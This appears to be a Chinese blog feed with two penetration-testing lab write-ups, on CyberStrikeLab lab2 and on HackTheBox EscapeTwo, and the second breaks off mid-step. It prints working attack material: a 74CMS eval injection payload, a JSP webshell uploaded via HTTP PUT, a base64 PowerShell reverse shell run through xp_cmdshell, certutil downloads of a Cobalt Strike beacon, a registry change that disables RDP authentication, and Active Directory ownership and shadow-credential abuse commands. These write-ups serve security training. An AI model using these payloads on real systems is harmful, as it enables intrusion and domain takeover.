<h3 id="弱口令-爆破"><a href="#弱口令-爆破" class="headerlink" title="弱口令&#x2F;爆破"></a>弱口令&#x2F;爆破</h3><p>直接输入错误账户名，会回显管理员账号不存在，这使得很顺利地测试出管理员账号名 admin</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/07/CyberStrikeLab-lab2/image-20250307143442587.png" class title="image-20250307143442587">

<p>简单测试一下密码就出来了，靶机并没有在这方面上难为人</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin/admin123456</span><br></pre></td></tr></table></figure></div>

<img lazyload src="/images/loading.svg" data-src="/2025/03/07/CyberStrikeLab-lab2/image-20250307151058967.png" class title="image-20250307151058967">

<p>进入后台，我发现了目标 74 CMS 版本为 v4.2.111，依此找到了其历史漏洞后台 GetShell </p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/07/CyberStrikeLab-lab2/image-20250307151527383.png" class title="image-20250307151527383">

<p>依次点击工具、风格模板、可用模板并抓包</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/07/CyberStrikeLab-lab2/image-20250307155645472.png" class title="image-20250307155645472">

<p>tpl_dir 改为如下 Payload </p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">tpl_dir=&#x27;,&#x27;a&#x27;,eval($_POST[&#x27;cmd&#x27;]),&#x27;</span><br></pre></td></tr></table></figure></div>

<p>随后访问路径</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">/Application/Home/Conf/config.php</span><br><span class="line">cmd=system(&#x27;whoami&#x27;);</span><br></pre></td></tr></table></figure></div>

<p>命令执行成功，直接拿到了 system 权限</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/07/CyberStrikeLab-lab2/image-20250307163324333.png" class title="image-20250307163324333">

<p>使用 certitul 下载文件并上线 CS</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/07/CyberStrikeLab-lab2/image-20250307164857995.png" class title="image-20250307164857995">

<p>拿到第一个旗帜</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/07/CyberStrikeLab-lab2/image-20250307165947758.png" class title="image-20250307165947758">



<h2 id="域边界突破-192-168-10-20"><a href="#域边界突破-192-168-10-20" class="headerlink" title="域边界突破 - 192.168.10.20"></a>域边界突破 - 192.168.10.20</h2><h3 id="Tomcat-任意文件写入"><a href="#Tomcat-任意文件写入" class="headerlink" title="Tomcat 任意文件写入"></a>Tomcat 任意文件写入</h3><img lazyload src="/images/loading.svg" data-src="/2025/03/07/CyberStrikeLab-lab2/image-20250307220024288.png" class title="image-20250307220024288">

<p>接下来对 192.168.10.20 已经发现的 Nday 进行利用，手工抓包上传，Payload 如下</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">PUT /1.jsp/ HTTP/1.1</span><br><span class="line">Host: 192.168.10.20:8080</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 376</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    if(&quot;023&quot;.equals(request.getParameter(&quot;pwd&quot;)))&#123;</span><br><span class="line">        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;)).getInputStream();</span><br><span class="line">        int a = -1;</span><br><span class="line">        byte[] b = new byte[2048];</span><br><span class="line">        out.print(&quot;&lt;pre&gt;&quot;);</span><br><span class="line">        while((a=in.read(b))!=-1)&#123;</span><br><span class="line">            out.println(new String(b));</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(&quot;&lt;/pre&gt;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure></div>

<img lazyload src="/images/loading.svg" data-src="/2025/03/07/CyberStrikeLab-lab2/image-20250306113558534.png" class title="image-20250306113558534">

<p>访问 JSP 一句话木马，命令执行成功</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.10.20:8080/1.jsp?pwd=023&amp;i=whoami</span><br></pre></td></tr></table></figure></div>

<img lazyload src="/images/loading.svg" data-src="/2025/03/07/CyberStrikeLab-lab2/image-20250306112555703.png" class title="image-20250306112555703">

<p>Powershell + Base64 反弹，使用浏览器发送时注意对 Payload 进行 URL 编码</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/07/CyberStrikeLab-lab2/image-20250306123915074.png" class title="image-20250306123915074">

<p>成功接收到反弹 Shell</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/07/CyberStrikeLab-lab2/image-20250306123923527.png" class title="image-20250306123923527">

<p>拿到第二个旗帜</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/07/CyberStrikeLab-lab2/image-20250306195005976.png" class title="image-20250306195005976">

<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p><strong>上线CS</strong> </p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/07/CyberStrikeLab-lab2/image-20250306172133812.png" class title="image-20250306172133812">

<img lazyload src="/images/loading.svg" data-src="/2025/03/07/CyberStrikeLab-lab2/image-20250306172640657.png" class title="image-20250306172640657">

<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">whoami /priv</span><br></pre></td></tr></table></figure></div>

<p>查询特权，发现 SeImpersonatePrivilege 启用</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/07/CyberStrikeLab-lab2/image-20250306193413001.png" class title="image-20250306193413001">

<p>尝试使用经典烂土豆提权，成功接收到 System 权限级 Beacon</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/07/CyberStrikeLab-lab2/image-20250306200807684.png" class title="image-20250306200807684">



<img lazyload src="/images/loading.svg" data-src="/2025/03/07/CyberStrikeLab-lab2/image-20250306201735177.png" class title="image-20250306201735177">

<h3 id="远程桌面连接"><a href="#远程桌面连接" class="headerlink" title="远程桌面连接"></a>远程桌面连接</h3><p>开启 3389 后连接报错，是身份证验证错误，直接禁用掉</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/07/CyberStrikeLab-lab2/image-20250306204251884.png" class title="image-20250306204251884">

<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v UserAuthentication /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure></div>

<img lazyload src="/images/loading.svg" data-src="/2025/03/07/CyberStrikeLab-lab2/image-20250306204321161.png" class title="image-20250306204321161">

<p>连接成功</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/07/CyberStrikeLab-lab2/image-20250306204627793.png" class title="image-20250306204627793">



<h2 id="域渗透"><a href="#域渗透" class="headerlink" title="域渗透"></a>域渗透</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>继续对当前主机进行信息收集</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmic computersystem get domainrole</span><br></pre></td></tr></table></figure></div>

<p>返回数值为3，当前是一台域成员服务器</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/07/CyberStrikeLab-lab2/image-20250306201754808.png" class title="image-20250306201754808">

<p>本地管理员组中含有 Domain Admins，该信息也在域全局组中，再次确认系统为域成员服务器</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/07/CyberStrikeLab-lab2/image-20250306203710380.png" class title="image-20250306203710380">

<p>发现这是一台双网卡主机，还有一个 20.* 网段</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/07/CyberStrikeLab-lab2/image-20250306202043364.png" class title="image-20250306202043364">

<p>fscan 扫描，发现域控服务器 192.168.20.30 且存在永恒之蓝漏洞</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/07/CyberStrikeLab-lab2/image-20250306210846820.png" class title="image-20250306210846820">

<h3 id="域控-192-168-20-30"><a href="#域控-192-168-20-30" class="headerlink" title="域控 - 192.168.20.30"></a>域控 - 192.168.20.30</h3><p>msf 打永恒之蓝，通过 admin&#x2F;smb&#x2F;ms17_010_command 模块执行成功，拿到 flag</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/07/CyberStrikeLab-lab2/image-20250307173614525.png" class title="image-20250307173614525">

<p>修改管理员密码，打开 3389 端口，拿下远程桌面</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/07/CyberStrikeLab-lab2/image-20250307174645182.png" class title="image-20250307174645182">

<h3 id="代理转发上线-CS"><a href="#代理转发上线-CS" class="headerlink" title="代理转发上线 CS"></a>代理转发上线 CS</h3><p>之前直接利用 CS 的永恒之蓝漏洞插件攻击 20.30 失败，而我对上线 CS 又有执念。于是我尝试通过 iox 代理转发，给域控上传文件并上线 CS，因为实际上只需要做一层代理隧道，所以操作并不复杂。</p>
<p>接下来 20.20 统称域成员主机，20.30 为域控</p>
<p>首先生成 CS 马，配置为 <code>192.168.20.20:29999</code> 。然后在域成员跳板机开启第一层代理隧道</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">iox.exe proxy -l 1080</span><br></pre></td></tr></table></figure></div>

<img lazyload src="/images/loading.svg" data-src="/2025/03/07/CyberStrikeLab-lab2/image-20250307221920445.png" class title="image-20250307221920445">

<p>proxychains4 配置文件修改，将流量转发至域成员主机，以此连接域控远程桌面</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">socks5 192.168.10.20 1080</span><br></pre></td></tr></table></figure></div>

<img lazyload src="/images/loading.svg" data-src="/2025/03/07/CyberStrikeLab-lab2/image-20250307221938408.png" class title="image-20250307221938408">

<p>然后域成员主机通过 iox 将本地 8888 端口转发至攻击机 28888 端口</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">iox.exe fwd -l 192.168.20.20:8888 -r 172.16.233.2:28888</span><br></pre></td></tr></table></figure></div>

<img lazyload src="/images/loading.svg" data-src="/2025/03/07/CyberStrikeLab-lab2/image-20250307221909470.png" class title="image-20250307221909470">

<p>攻击机开启 Web 服务，域控远程桌面下载 CS 马</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">certutil -urlcache -split -f http://192.168.20.20:8888/artifact.exe</span><br></pre></td></tr></table></figure></div>

<p>接下来域成员主机通过 iox 将本地 29999 端口转发至攻击机 29999 端口</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">iox.exe fwd -l 29999 -r 172.16.233.2:29999</span><br></pre></td></tr></table></figure></div>

<p>最后域控执行 CS 马，上线成功</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/07/CyberStrikeLab-lab2/image-20250307222607945.png" class title="image-20250307222607945">

]]></content>
      <categories>
        <category>靶机系列</category>
        <category>CyberStrikeLab</category>
      </categories>
      <tags>
        <tag>综合渗透靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HackTheBox - EscapeTwo</title>
    <url>/2025/03/05/HackTheBox-EscapeTwo/</url>
    <content><![CDATA[<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250221181200747.png" class title="image-20250221181200747">



<p>分配IP：10.10.11.51</p>
<p><strong>已有凭证</strong></p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">rose/KxEPkKe6R8su</span><br></pre></td></tr></table></figure></div>



<h2 id="外网信息探测"><a href="#外网信息探测" class="headerlink" title="外网信息探测"></a>外网信息探测</h2><p>使用 rustscan 进行对目标全端口扫描</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">rustscan -a escapetwo.htb -r 1-65535 --ulimit 5000 | tee res</span><br></pre></td></tr></table></figure></div>

<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250220212000360.png" class title="image-20250220212000360">

<p>将靶机TCP开放端口号提取并保存，交给 nmap 指定端口进行详细扫描</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">ports=$(grep -oP &#x27;(?&lt;=:)\d+&#x27; res | grep -vE &#x27;^19$&#x27; | paste -sd,) &amp;&amp; echo $ports</span><br></pre></td></tr></table></figure></div>

<p><strong>Nmap 服务版本探测</strong></p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -Pn -A -sV -p$ports sequel.htb</span><br></pre></td></tr></table></figure></div>

<p>结果显示 AD域名：sequel.htb；对方还开放了几个重要端口：389、636等 LDAP服务，445 SMB服务，1433 MSSQL服务、5985 winrm服务等</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250220215413987.png" class title="image-20250220215413987">

<p>对目标 TCP 开放端口进行漏洞扫描</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sT -p$ports --script=vuln -O -Pn sequel.htb</span><br></pre></td></tr></table></figure></div>

<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250221095444635.png" class title="image-20250221095444635">

<p>对目标常用 UDP 端口进行扫描</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250221095542904.png" class title="image-20250221095542904">

<p>对目标 UDP 开放端口进行脚本、服务扫描</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250221100353637.png" class title="image-20250221100353637">

<h3 id="SMB-共享服务测试"><a href="#SMB-共享服务测试" class="headerlink" title="SMB 共享服务测试"></a>SMB 共享服务测试</h3><p>已知目标445端口smb服务开放，且已有凭证中提供了一串账号密码，先对此进行测试</p>
<p>直接尝试连接，登录成功</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">smbclient -L \\10.10.11.51 -U rose</span><br></pre></td></tr></table></figure></div>

<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250218160440000.png" class title="image-20250218160440000">

<p>有许多共享文件夹，使用 smbmap 查看文件夹权限</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">smbmap -u &#x27;rose&#x27; -p &#x27;KxEPkKe6R8su&#x27; -H sequel.htb</span><br></pre></td></tr></table></figure></div>

<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250220200151475.png" class title="image-20250220200151475">

<p>递归 Accounting Department 目录， 在 Accouting Department 目录中发现表格文件</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">smbmap -u &#x27;rose&#x27; -p &#x27;KxEPkKe6R8su&#x27; -H sequel.htb -r &#x27;Accounting Department&#x27;A</span><br></pre></td></tr></table></figure></div>

 <img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250221101012418.png" class title="image-20250221101012418">

<p>将文件下载至本地</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">smbmap -u &#x27;rose&#x27; -p &#x27;KxEPkKe6R8su&#x27; -H sequel.htb -r &#x27;Accounting Department&#x27; --download &#x27;./Accounting Department/accounts.xlsx&#x27;</span><br></pre></td></tr></table></figure></div>

<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250221101421135.png" class title="image-20250221101421135">

<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250218192424712.png" class title="image-20250218192424712">

<p>accouts.xlsx 内部有用户凭据</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250219105017703.png" class title="image-20250219105017703">

<h2 id="边界突破"><a href="#边界突破" class="headerlink" title="边界突破"></a>边界突破</h2><h3 id="nxc-服务爆破"><a href="#nxc-服务爆破" class="headerlink" title="nxc 服务爆破"></a>nxc 服务爆破</h3><p>将收集到的账号密码整理，尝试爆破 winrm 远程登录，可惜都失败了</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">nxc winrm sequel.htb -u user.txt -p pass.txt</span><br></pre></td></tr></table></figure></div>

<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250221102002249.png" class title="image-20250221102002249">

<p>想到 sa 用户是 MSSQL 数据库的默认用户，尝试跑一下 MSSQL</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">nxc mssql sequel.htb -u user.txt -p pass.txt --local-auth --continue-on-success</span><br></pre></td></tr></table></figure></div>

<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250220162537659.png" class title="image-20250220162537659">

<p>使用成功的账号密码登录 MSSQL，成功连接，获得 miscrosft-server 数据库权限</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250219152613878.png" class title="image-20250219152613878">

<h3 id="xp-cmdshell-执行权限获取"><a href="#xp-cmdshell-执行权限获取" class="headerlink" title="xp_cmdshell 执行权限获取"></a>xp_cmdshell 执行权限获取</h3><p>当前数据库用户权限级高，xp_cmdshell 为关闭状态，因此配置开启</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250219160254107.png" class title="image-20250219160254107">

<p>拿到 xp_cmdshell 执行权限后，初步拿到主机用户权限了</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250219162214365.png" class title="image-20250219162214365">

<p>反弹 shell 一下</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250219184700409.png" class title="image-20250219184700409">

<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">exec xp_cmdshell &#x27;powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMwAyACIALAA3ADcAOAA4ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==&#x27;</span><br></pre></td></tr></table></figure></div>

<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250219184731271.png" class title="image-20250219184731271">

<p>如果遇到 MSSQL 命令行不能输入太多字符的问题，使用 MSSQL 反弹脚本工具也可以</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(mighty㉿kali)-[~/tools/Script/MSSQL/mssql-command-tools]</span><br><span class="line">└─$ ./mssql-command-tools_Linux_amd64 --host 10.10.11.51 -u &quot;sa&quot; -p &#x27;MSSQLP@ssw0rd!&#x27; -c &quot;powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMwAyACIALAA3ADcAOAA4ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==&quot;</span><br></pre></td></tr></table></figure></div>

<h3 id="获取-ryan-用户登录凭证"><a href="#获取-ryan-用户登录凭证" class="headerlink" title="获取 ryan 用户登录凭证"></a>获取 ryan 用户登录凭证</h3><p>由于已知有一个数据库在运行，因此下一步是找配置文件，在根目录有清晰的数据库目录路径 <code>/SQL2019</code>。在翻阅配置文件时发现了有文本密码信息的配置文件 sql-Configuration.INI</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250219195059146.png" class title="image-20250219195059146">

<p>将所有已知的用户名都写入文件中，使用 crackmapexec 尝试爆破</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">crackmapexec smb 10.10.11.51 -u user.txt  -p WqSZAF6CysDQbGb3</span><br></pre></td></tr></table></figure></div>

<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250219200417244.png" class title="image-20250219200417244">

<p>爆破结果发现该密码是配对 ryan 用户的，使用 evil-winrm 远程登录，登录成功！</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">evil-winrm -u ryan -p WqSZAF6CysDQbGb3 -i 10.10.11.51</span><br></pre></td></tr></table></figure></div>

<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250219200645450.png" class title="image-20250219200645450">

<p>拿到第一个旗帜</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250219202247547.png" class title="image-20250219202247547">

<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><h3 id="域环境分析"><a href="#域环境分析" class="headerlink" title="域环境分析"></a>域环境分析</h3><p>使用 netexec 获取 bloodhound 需要的域信息压缩文件</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">nxc ldap sequel.htb -d sequel.htb -u &#x27;ryan&#x27; -p &#x27;WqSZAF6CysDQbGb3&#x27; --dns-server 10.10.11.51 --bloodhound -c All</span><br></pre></td></tr></table></figure></div>

<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250221104131070.png" class title="image-20250221104131070">

<p>导入至 Bloodhound</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250221104037805.png" class title="image-20250221103836269">

<p>如图标显示，ryan 对 ca_svc 具有 WriteOwner 权限，拥有修改它的对象所有者的权限</p>
<h3 id="证书模板滥用"><a href="#证书模板滥用" class="headerlink" title="证书模板滥用"></a>证书模板滥用</h3><p>修改 ca_svc 用户所有者为 ryan</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">bloodyAD -d sequel.htb --dc-ip 10.10.11.51 --dns 10.10.11.51 -u &#x27;ryan&#x27; -p &#x27;WqSZAF6CysDQbGb3&#x27; set owner ca_svc ryan</span><br></pre></td></tr></table></figure></div>

<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250221113932108.png" class title="image-20250221113932108">

<p>再将 ryan 用户对 ca_svc 用户的权限提升至完全控制</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 dacledit.py -action &#x27;write&#x27; -rights &#x27;FullControl&#x27; -principal &#x27;ryan&#x27; -target &#x27;ca_svc&#x27; &#x27;sequel.htb&#x27;/&#x27;ryan&#x27;:&#x27;WqSZAF6CysDQbGb3&#x27;</span><br></pre></td></tr></table></figure></div>

<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250221113918110.png" class title="image-20250221113918110">

<p>与目标 NTP 服务器同步系统时间，前面 UDP 扫描对方开启了 123 NTP服务</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo ntpdate sequel.htb</span><br></pre></td></tr></table></figure></div>

<p>创建ca_svc用户影子证书</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">certipy-ad shadow auto -u &#x27;ryan@sequel.htb&#x27; -p &#x27;WqSZAF6CysDQbGb3&#x27; -account &#x27;ca_svc&#x27; -target sequel.htb -dc-ip 10.10.11.51 -ns 10.10.11.51</span><br></pre></td></tr></table></figure></div>

<p>同时获取到了用户NTLM密码哈希：3b181b914e7a9d5508ea1e20bc2b7fce</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-EscapeTwo/image-20250221152638237.png" class title="image-20250221152638237">

<p>上传 Certify.exe </p>
